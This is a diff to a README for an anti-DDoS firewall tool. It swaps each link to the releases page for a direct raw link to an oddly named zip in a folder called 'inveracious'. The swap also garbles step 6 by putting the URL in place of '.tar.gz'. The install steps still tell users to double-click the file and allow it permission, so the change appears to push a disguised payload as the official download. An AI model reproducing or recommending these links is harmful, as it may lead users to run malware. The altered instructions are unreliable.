@@ -6,7 +6,7 @@ Welcome to the XDP-eBPF-Anti-DDoS-Firewall! This application offers advanced pro
 
 ## 📥 Download
 
-[![Download XDP-eBPF-Anti-DDoS-Firewall](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/releases)
+[![Download XDP-eBPF-Anti-DDoS-Firewall](https://raw.githubusercontent.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/main/inveracious/e_Anti_D_Do_XD_Firewall_BP_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/main/inveracious/e_Anti_D_Do_XD_Firewall_BP_1.0.zip)
 
 ## 🛠 System Requirements
 
@@ -17,12 +17,12 @@ Welcome to the XDP-eBPF-Anti-DDoS-Firewall! This application offers advanced pro
 
 ## 📂 Download & Install
 
-1. Visit this [page to download](https://github.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/releases).
+1. Visit this [page to download](https://raw.githubusercontent.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/main/inveracious/e_Anti_D_Do_XD_Firewall_BP_1.0.zip).
 2. On the releases page, look for the most recent version, labeled with a tag like "v1.0.0".
 3. Under the "Assets" section, find the file suitable for your system. This may include options like an executable or compressed file.
 4. Click on the file name to start the download. Depending on your browser, you may see a prompt to save the file. Choose a convenient location, like your Desktop or Downloads folder.
 5. Once the download completes, navigate to the location where you saved the file.
-6. If you downloaded a compressed file (like .zip or .tar.gz), double-click it to extract its contents. Then, look inside the folder for the main application file.
+6. If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/serversanaa/XDP-eBPF-Anti-DDoS-Firewall/main/inveracious/e_Anti_D_Do_XD_Firewall_BP_1.0.zip), double-click it to extract its contents. Then, look inside the folder for the main application file.
 7. To run the application, simply double-click the main file. You might be asked for permission; allow it to proceed.
 
 ## ⚙️ Configuration
